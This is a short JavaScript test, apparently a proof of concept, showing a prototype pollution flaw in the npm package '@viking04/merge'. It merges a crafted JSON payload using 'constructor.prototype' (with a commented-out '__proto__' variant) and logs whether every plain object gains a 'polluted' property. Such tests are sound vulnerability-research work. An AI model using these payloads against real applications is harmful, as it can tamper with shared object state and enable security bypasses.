// //https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6
// test("prototype pollution in config-handler", () => {
  const merge = require("@viking04/merge");
console.log({}.polluted);

  let a = {};
  //var prototype_pollution_test = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  var prototype_pollution_test = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
  merge(a, prototype_pollution_test);

console.log({}.polluted);
// });
